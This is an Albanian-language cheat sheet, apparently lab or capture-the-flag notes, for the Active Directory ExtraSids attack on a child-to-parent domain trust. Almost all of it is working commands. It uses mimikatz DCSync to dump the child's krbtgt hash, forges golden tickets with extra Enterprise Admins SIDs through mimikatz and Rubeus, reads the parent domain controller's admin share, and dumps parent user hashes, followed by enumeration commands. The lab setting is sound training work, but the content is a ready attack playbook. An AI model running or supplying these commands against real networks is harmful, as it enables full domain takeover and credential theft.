### **ExtraSids Attack - Golder Ticket**

```bash
1.  Zbulimi i domain-it dhe SID
# Shiko domain-in aktual dhe SID e tij
Get-ADDomain
# Merr SID e domain-it për Golden Ticket
Get-DomainSID

2. Marrja e hash-it të KRBTGT për child domain
# Me Mimikatz
mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt

3.  Marrja e SID të Enterprise Admins të parent domain
# Merr DistinguishedName dhe ObjectSID të Enterprise Admins të parent
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
    Select-Object DistinguishedName,ObjectSID
    
 4. Krijimi dhe injektimi i Golden Ticket
 # mimkatz
 kerberos::golden /user:hacker \\
    /domain:LOGISTICS.INLANEFREIGHT.LOCAL \\
    /sid:S-1-5-21-2806153819-209893948-922872689 \\
    /krbtgt:<hash_krbtgt_child> \\
    /sids:S-1-5-21-3842939050-3880317879-2865463114-519 \\
    /ptt

# rubeus
Rubeus.exe golden /rc4:<hash_krbtgt_child> \\
    /domain:LOGISTICS.INLANEFREIGHT.LOCAL \\
    /sid:S-1-5-21-2806153819-209893948-922872689 \\
    /sids:S-1-5-21-3842939050-3880317879-2865463114-519 \\
    /user:hacker /ptt
    
/user – përdoruesi i ticket-it (mund të jetë i imagjinuar, nuk duhet të ekzistojë realisht).
/domain – domain ku ke hash-in e krbtgt (child).
/sid – SID i child domain (përdoret për Golden Ticket).
/sids – SID i Enterprise Admins të parent domain.
/ptt – inject ticket në memorie.

5. Verifikimi i Golden Ticket
# Shiko se golden ticket është në cache
klist

6. Hyrja në folder-in e parent domain
# Shiko folder-in në parent DC
ls \\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\C$\\ExtraSids
Get-Content \\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\C$\\ExtraSids\\flag.txt

7. DCSync për përdorues të parent domain
# Nxjerr hash-in e përdoruesit në parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL
```



### 1️⃣ Kontrollo se cili user dhe domain je loguar

```bash
whoami
whoami /fqdn
echo %USERDOMAIN%
Get-ADDomain | select Name,ObjectSID,Forest
```

### 2️⃣ Shiko privilegjet e përdoruesit

```bash
whoami /groups
Get-ADUser $env:USERNAME -Properties memberof | select memberof
```

### 3️⃣ Shiko Domain Controllers (child dhe parent)

```bash
nltest /dclist:$env:USERDOMAIN
Get-ADDomainController -Discover
nltest /dsgetdc:INLANEFREIGHT.LOCAL   # parent domain
```

### 4️⃣ Shiko share-et e qasshme në DC

```bash
net view \\\\<DC_IP_or_Name>
```

### Shembull:

```bash
net view \\\\172.16.5.5
net view \\\\ACADEMY-EA-DC01
```

### 5️⃣ Shiko përdoruesit me privilegje të larta

```bash
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Enterprise Admins" -Server ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### 6️⃣ Kontrollo nëse mund të bësh DCSync për krbtgt

```bash
mimikatz # lsadump::dcsync /user:<childdomain>\\krbtgt
```

### 7️⃣ Ping dhe kontroll portesh të rëndësishme

```bash
Test-NetConnection -ComputerName <DC_IP> -Port 445   # SMB
Test-NetConnection -ComputerName <DC_IP> -Port 389   # LDAP
Test-NetConnection -ComputerName <DC_IP> -Port 88    # Kerberos
```

### 8️⃣ Nëse ke Golden Ticket të injektuar, shiko cache-in

```bash
klist
```

### 9️⃣ Shiko nëse mund të qasesh folderin e CTF

```bash
dir \\\\<DC_IP_or_Name>\\C$           # shpesh nuk është i qasshëm në lab
dir \\\\<DC_IP_or_Name>\\ExtraSids    # folder specifik CTF
Get-Content \\\\<DC_IP_or_Name>\\ExtraSids\\flag.txt
```